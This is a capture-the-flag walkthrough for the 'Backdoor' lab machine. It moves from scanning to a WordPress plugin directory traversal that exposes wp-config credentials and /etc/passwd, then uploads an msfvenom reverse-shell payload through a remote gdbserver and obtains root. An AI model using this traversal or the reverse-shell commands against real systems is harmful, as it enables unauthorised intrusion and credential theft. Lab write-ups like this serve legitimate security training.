# scanning
* `TCP` Scan
TARGET=10.10.11.125 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?  syn-ack ttl 63

# web enum
> dirsearch -u http://10.10.11.125 -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f
[10:19:49] 301 -    0B  - /index.php  ->  http://10.10.11.125/
[10:19:49] 301 -    0B  - /index.php/  ->  http://10.10.11.125/
[10:19:57] 200 -   19KB - /license.txt
[10:20:27] 200 -    7KB - /readme.html
[10:20:36] 403 -  277B  - /server-status/
[10:20:36] 403 -  277B  - /server-status
[10:21:03] 301 -  315B  - /wp-admin  ->  http://10.10.11.125/wp-admin/
[10:21:03] 302 -    0B  - /wp-admin/  ->  http://10.10.11.125/wp-login.php?redirect_to=http%3A%2F%2F10.10.11.125%2Fwp-admin%2F&reauth=1
[10:21:03] 200 -    0B  - /wp-blog-header.php
[10:21:03] 200 -    0B  - /wp-config.php
[10:21:03] 200 -    0B  - /wp-content/
[10:21:03] 200 -    0B  - /wp-cron.php
[10:21:03] 301 -  317B  - /wp-content  ->  http://10.10.11.125/wp-content/
[10:21:04] 301 -  318B  - /wp-includes  ->  http://10.10.11.125/wp-includes/
[10:21:04] 200 -  223B  - /wp-links-opml.php
[10:21:04] 200 -    0B  - /wp-load.php
[10:21:04] 200 -    6KB - /wp-login.php
[10:21:04] 200 -   51KB - /wp-includes/
[10:21:04] 403 -    3KB - /wp-mail.php
[10:21:04] 500 -    0B  - /wp-settings.php
[10:21:04] 302 -    0B  - /wp-signup.php  ->  http://10.10.11.125/wp-login.php?action=register
[10:21:04] 200 -  135B  - /wp-trackback.php
[10:21:06] 405 -   42B  - /xmlrpc.php
[10:21:06] 405 -   42B  - /xmlrpc.php/

> wpscan --url http://10.10.11.125
WordPress version 5.8.1 identified

> wpscan --url http://10.10.11.125 -e p,u --plugins-detection aggressive

* http://10.10.11.125/wp-content/plugins/ebook-download/

> searchsploit wordpress ebook
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal                                                                              | php/webapps/39575.txt
WordPress Plugin Facebook Opengraph Meta 1.0 - SQL Injection                                                                           | php/webapps/17773.txt
WordPress Plugin Facebook Promotions 1.3.3 - SQL Injection                                                                             | php/webapps/17737.txt
WordPress Plugin Facebook Survey 1.0 - SQL Injection                                                                                   | php/webapps/22853.txt
WordPress Plugin flash-album-gallery - 'facebook.php' Cross-Site Scripting                                                             | php/webapps/36383.txt
WordPress Plugin Nextend Facebook Connect 1.4.59 - Cross-Site Scripting                                                                | php/webapps/35439.txt
WordPress Plugin Spider Facebook - 'facebook.php' SQL Injection                                                                        | php/webapps/39300.txt
WordPress Theme Diary/Notebook Site5 - Email Spoofing                                                                                  | php/webapps/19862.pl
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=


define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );
/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

* use burp intruder to sequence /proc/id/cmdline to get running processes and command lines

* msfconsole, gdb_server exploit to gain shell

cat user.txt


https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver

```
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=5555 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```
user@Backdoor:~$ exit
exit
exit
root@Backdoor:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# ls
ls
root.txt
root@Backdoor:~# cat root.txt
cat root.txt



# ref
https://infosecwriteups.com/backdoor-hackthebox-walkthrough-6e4e8b483db1
https://zsahi.wordpress.com/2018/09/10/file-inclusion/
